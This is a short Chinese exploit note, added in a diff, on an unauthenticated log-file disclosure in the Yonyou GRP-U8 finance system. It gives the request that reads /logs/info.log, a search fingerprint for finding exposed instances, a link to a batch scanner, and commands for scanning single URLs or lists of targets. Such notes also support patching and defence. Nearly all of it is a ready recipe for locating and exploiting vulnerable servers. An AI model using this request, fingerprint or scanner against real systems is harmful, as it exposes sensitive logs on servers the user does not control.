@@ -1,0 +1,20 @@
+直接访问log日志，泄露敏感信息
+
+POC
+GET /logs/info.log HTTP/1.1
+
+
+
+批量扫描工具:https://github.com/MzzdToT/HAC_Bored_Writing/tree/main/unauthorized/%E7%94%A8%E5%8F%8BGRP-U8
+
+
+指纹
+body="U8Accid" || title="GRP-U8" || body="用友优普信息技术有限公司"
+
+工具利用
+python3 GRP-U8_loginfo.py -u http://127.0.0.1:1111 单个url测试
+
+python3 GRP-U8_loginfo.py -f url.txt 批量检测
+
+会在当前目录生成存在漏洞的vuln.txt文件
+
